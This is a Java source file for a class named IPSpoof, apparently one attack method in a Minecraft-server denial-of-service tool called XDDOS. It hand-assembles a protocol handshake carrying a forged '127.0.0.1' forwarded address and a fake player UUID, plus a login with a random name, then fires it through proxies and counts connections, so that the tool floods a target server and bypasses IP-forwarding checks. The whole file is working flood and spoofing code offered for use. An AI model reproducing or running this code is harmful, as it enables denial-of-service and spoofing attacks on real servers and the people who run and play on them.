package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.util.Random;
import java.util.UUID;

public class IPSpoof
  implements IMethod {
  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(len);

    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    }

    return buffer.toString();
  }

  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }

    out.writeByte(paramInt);
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);

    try {
      out.writeByte(59);
      out.writeByte(0);
      writeVarInt(out, XDDOS.protcolID);
      out.writeByte(52);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      out.writeBytes(UUID.nameUUIDFromBytes("OfflinePlayer:Herobrine".getBytes("UTF-8")).toString().replaceAll("\\-", ""));
      out.writeByte(99);
      out.writeByte(233);
      out.writeByte(2);
      out.writeByte(13);
      out.writeByte(0);
      out.writeByte(11);
      out.writeBytes(randomString(11));
      out.close();
    } catch (IOException var6) {
      var6.printStackTrace();
    }

    channel.writeAndFlush(b);
    NettyBootstrap.totalConnections++;
    NettyBootstrap.integer++;
    channel.close();
  }
}
